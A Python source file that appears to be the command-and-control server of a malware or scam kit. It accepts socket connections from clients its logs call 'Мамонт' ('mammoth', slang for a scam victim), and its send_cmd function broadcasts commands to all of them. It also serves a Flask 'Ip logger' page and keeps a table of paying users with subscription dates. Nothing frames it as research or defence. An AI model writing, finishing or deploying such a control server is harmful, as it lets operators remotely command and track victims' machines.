import json
import socket
import jpysocket
import threading
import datetime
from flask import Flask, jsonify, request


clients = []

server_socket = socket.socket()
server_socket.bind(('127.0.0.1', 7777))
server_socket.listen(50)

app = Flask(__name__)


def log(text):
    current_time = datetime.datetime.now()
    formatted_time = current_time.strftime("[%d.%m.%Y %H:%M:%S] ")
    ftext = formatted_time + text + '\n'
    print(ftext)
    with open("logs.txt", "a") as logs_file:
        logs_file.write(ftext)
        logs_file.close()


users = {
    "NULL": {
        "subscription_expiration": "2023-06-30"
    }
}


def send_cmd(cmd):
    for client in clients:
        message = jpysocket.jpyencode(cmd)
        client.send(message)

    return {"clients": len(clients)}


def handle_client(client_socket):
    client_address = client_socket.getpeername()
    ip = f"{client_address[0]}:{client_address[1]}"
    log(f"[INFO/CONNECT] * Мамонт ({ip}) подключился!")
    clients.append(client_socket)

    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
        except ConnectionResetError:
            break

    log(f"[INFO/DISCONNECT] * Мамонт ({ip}) отключился!")
    clients.remove(client_socket)
    client_socket.close()


def accept_connects():
    while True:
        client_socket, address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket,)).start()



@app.route('/')
def help_page():
    html = f'''
    <br>
    <br>
    <br>
    <center>
    <h1>Ip logger</h1>
    <hr>
    <hr>
    <table>
    '''
    
    # Iterate over the users and append their information to the HTML table
    for user, info in users.items():
        html += f'''
      <tr>
      </tr>
        '''
    
    html += '''
    </table>
    </center>
    '''
    
    # Add the CSS styles
    html += '''
    <style>
  body {
    background-color: #E0EEE0;
    font-family: 'Comic Sans MS', cursive;
  }
  
  h1, h2, h3, h4, h5 {
    margin: 0;
    padding: 0;
  }
  
  h1 {
    font-size: 36px;
    color: #006400;
    margin-bottom: 20px;
    text-shadow: 2px 2px #FFF;
    background-image: linear-gradient(to right, #006400, #008000);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  
  h2 {
    font-size: 24px;
    color: #008000;
    margin-bottom: 10px;
    text-shadow: 1px 1px #FFF;
    background-image: linear-gradient(to right, #008000, #009900);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  
  h3 {
    font-size: 18px;
    color: #009900;
    margin-bottom: 5px;
    text-shadow: 1px 1px #FFF;
    background-image: linear-gradient(to right, #009900, #00CC00);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  
  p {
    font-size: 16px;
    color: #006400;
    margin-bottom: 10px;
    text-shadow: 1px 1px #FFF;
  }
  
  center {
    max-width: 800px;
    margin: 0 auto;
    padding: 20px;
    background-color: #FFFFE0;
    border-radius: 5px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1), 0 4px 10px rgba(0, 0, 0, 0.2);
    transition: all 0.3s ease-in-out;
  }
  
  center:hover {
    transform: scale(1.05);
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2), 0 8px 20px rgba(0, 0, 0, 0.3);
  }
  
  table {
    border-collapse: collapse;
    width: 100%;
    border-radius: 5px;
    overflow: hidden;
  }
  
  th, td {
    padding: 10px;
    text-align: left;
    border-bottom: 1px solid #009900;
  }
  
  th {
    background-image: linear-gradient(to right, #E0EEE0, #FFFFE0);
  }
  
  td {
    background-color: #E0EEE0;
  }
  
  /* Additional styles */
  body {
    animation: colorChange 10s infinite;
  }
  
  @keyframes colorChange {
    0% {
      background-color: #E0EEE0;
    }
    50% {
      background-color: #FFFACD;
    }
    100% {
      background-color: #E0EEE0;
    }
  }
  
  h1, h2, h3 {
    text-transform: uppercase;
    font-weight: bold;
    letter-spacing: 2px;
  }
  
  p {
    line-height: 1.5;
  }
  
  center {
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2), 0 8px 20px rgba(0, 0, 0, 0.3);
  }
  
  table {
    border-radius: 10px;
  }
  
  th, td {
    border-radius: 5px;
  }
</style>
<div class="subheading">
  <h3>      Loger</h3>
</div>

<style>
  .subheading {
    background-color: #FFFFE0;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1), 0 4px 10px rgba(0, 0, 0, 0.2);
    margin-top: 40px;
  }
  
  .subheading h3 {
    font-size: 24px;
    color: #009900;
    margin-bottom: 10px;
    text-shadow: 1px 1px #FFF;
    background-image: linear-gradient(to right, #009900, #00CC00);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  
  .subheading p {
    font-size: 18px;
    color: #006400;
    margin-bottom: 5px;
  }
</style>
    '''
    
    return html




if __name__ == '__main__':
    threading.Thread(target=accept_connects).start()
    app.run(host='0.0.0.0', port=80, debug=True, use_reloader=False)
